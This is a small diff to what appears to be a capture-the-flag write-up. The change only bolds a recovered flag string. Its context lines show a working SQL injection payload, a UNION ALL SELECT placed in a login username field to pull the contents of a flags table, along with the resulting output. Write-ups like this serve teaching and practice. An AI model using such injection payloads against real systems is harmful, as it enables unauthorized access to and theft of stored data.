@@ -62,7 +62,7 @@ We'll assume that flag table has 1 column:
 ```
 	username=bar' UNION ALL SELECT (SELECT * FROM flags), 'bar'-- &password=bar 
 ```
---> User D0_Y0U_H34R_TH3_P30PL3_H4X successfully logged in!
+--> User **D0_Y0U_H34R_TH3_P30PL3_H4X** successfully logged in!
 
 If flag table didn't had 1 column, we could get the columns as follows:
 ```
